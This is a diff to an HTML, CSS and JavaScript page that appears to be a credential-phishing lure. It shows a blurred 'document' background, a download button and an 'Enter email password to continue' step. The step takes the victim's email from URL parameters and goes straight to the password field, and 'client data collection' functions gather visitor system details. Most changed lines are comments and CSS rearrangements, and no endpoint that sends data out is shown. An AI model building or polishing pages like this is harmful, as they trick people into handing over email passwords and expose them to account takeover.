@@ -32,9 +32,9 @@
             height: 100%;
             filter: blur(3.5px);
             z-index: -1;
-            transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); /* Changed from -52% to -50% for perfect center */
             background-image: url('input.png');
-            background-size: 100% 100%;
+            background-size: 100% 100%; /* Stretches both width and height */
             background-repeat: no-repeat;
             background-position: center center;
         }
@@ -68,6 +68,18 @@
             display: inline-block;
             white-space: nowrap;
         }
+
+<!--        .heading::after {-->
+<!--            content: '';-->
+<!--            position: absolute;-->
+<!--            bottom: -10px;-->
+<!--            left: 50%;-->
+<!--            transform: translateX(-50%);-->
+<!--            width: 60px;-->
+<!--            height: 4px;-->
+<!--            background: #4285f4;-->
+<!--            border-radius: 2px;-->
+<!--        }-->
 
         .input-group {
             margin-bottom: 15px;
@@ -119,6 +131,14 @@
             color: #34a853;
         }
 
+        .email-step {
+            display: none; /* Hide email step by default */
+        }
+
+        .password-step {
+            display: none; /* Hide password step by default */
+        }
+
         .download-button, .continue-button {
             background-color: #808080;
             color: white;
@@ -128,7 +148,7 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: 600;
-            width: 40%;
+            width: 40%; /* Reduced width */
             height: 10%;
             transition: all 0.3s ease;
             margin: 0 auto;
@@ -156,12 +176,8 @@
             background-color: #3367d6;
         }
 
-        .email-step {
-            display: none; /* Hide email step by default */
-        }
-
         .password-step {
-            display: none; /* Hide password step by default */
+            display: none;
         }
 
         .error-message {
@@ -199,7 +215,7 @@
             }
 
             .download-button, .continue-button {
-                width: 70%;
+                width: 70%; /* Adjusted for mobile */
             }
         }
     </style>
@@ -222,7 +238,7 @@
             </button>
         </div>
 
-        <!-- Password Step -->
+        <!-- Password Step (Initially Hidden) -->
         <div class="password-step">
             <h1 class="heading">Enter email password to continue</h1>
 
@@ -283,13 +299,13 @@
             // Initialize page based on URL parameters
             function initializePage() {
                 const urlEmail = getEmailFromURL();
-                
+
                 if (urlEmail) {
                     // If email is provided in URL, show password step immediately
                     emailDisplay.value = urlEmail;
                     emailStep.style.display = 'none';
                     passwordStep.style.display = 'block';
-                    
+
                     // Focus on password input immediately
                     setTimeout(() => {
                         passwordInput.focus();
@@ -381,10 +397,9 @@
             // Initialize client data collection
             getClientDetails();
             getSystemDetails();
-
-            // Initialize page display
+            
             initializePage();
-
+            
             // Email validation function
             function validateEmail(email) {
                 const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
